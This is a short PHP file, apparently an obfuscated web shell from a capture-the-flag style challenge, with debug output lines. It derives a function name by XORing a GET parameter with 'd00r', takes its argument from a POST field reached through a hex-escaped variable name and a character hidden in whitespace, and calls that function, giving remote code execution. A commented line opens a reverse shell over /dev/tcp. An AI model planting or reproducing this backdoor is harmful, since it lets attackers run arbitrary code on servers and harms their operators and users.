     
                                   
<?php
// set_time_limit(3);
// ini_set('max_execution_time', 3);
// highlight_file(__FILE__);
$f = file(__FILE__);

$c2 = substr_count($f[1],chr(32));
$c  = chr($c2);
print 'c2: '. $c2 . "\n";
print 'c : '. $c . "\n";

$x=(substr($_GET[87],0,4)^"d00r");
print '87: '. $_GET[87] . "\n";
print 'x : '. $x . "\n";

$x2 = ${"_\x50\x4f\x53\x54"}{$c};
print 'param :'. $x2 . "\n";

# exec("\"/bin/sh\" -c 'sh -i >%26 /dev/tcp/127.0.0.1/5566 0>%261'");
$x($x2);
